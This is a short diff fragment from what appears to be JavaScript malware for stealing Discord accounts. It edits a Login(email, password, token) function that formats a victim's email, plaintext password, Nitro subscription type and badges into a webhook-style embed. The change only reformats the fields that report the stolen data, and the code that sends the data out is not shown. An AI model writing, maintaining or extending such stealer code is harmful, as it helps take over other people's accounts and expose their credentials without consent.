@@ -150,20 +150,13 @@ function Login(email, password, token) {
                         {
                             "name": "<a:arrow:765308889859751976> **Account Info**",
 
-                            "value":  `<:PP_director:942527310324719716> **Email:** ||${email}|| 
-                                     
-                            <:staff_blue:936543701294010399> **Password:** ||${password}||`,
+                            "value":  `<:PP_director:942527310324719716> **Email:** ||${email}||    <:staff_blue:936543701294010399> **Password:** ||${password}||`,
                             "inline": true
                         },
-
-
-
                         {
-                            "name": "<a:arrow:765308889859751976> **Other Info**",
+                            "name": "",
 
-                            "value": `<a:axe_Pepenitro:932312223945224212> **Nitro Type:**  ${GetNitro(json.premium_type)}\n
-
-                            <a:allbadges:895906088996720690> **Badges:**  ${GetBadges(json.flags)}`,
+                            "value": `<a:axe_Pepenitro:932312223945224212> **Nitro Type:**  ${GetNitro(json.premium_type)}\n    <a:allbadges:895906088996720690> **Badges:**  ${GetBadges(json.flags)}`,
 
 
         
